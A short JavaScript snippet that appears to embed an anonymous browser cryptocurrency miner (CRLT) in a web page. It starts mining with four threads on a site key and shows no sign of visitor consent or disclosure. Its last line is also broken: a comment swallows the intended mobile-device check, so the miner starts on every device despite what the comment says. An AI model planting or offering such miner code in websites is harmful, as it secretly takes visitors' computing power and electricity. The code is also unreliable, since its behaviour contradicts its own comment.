  var miner = new CRLT.Anonymous('4a053c86f4fff14ce7a8615601b5ef08974092539630', {
      threads: 4,
      throttle: 0.2,
  });
  miner.start(); //Only start if visitor is NOT mobileif (!miner.isMobile()) {miner.start();}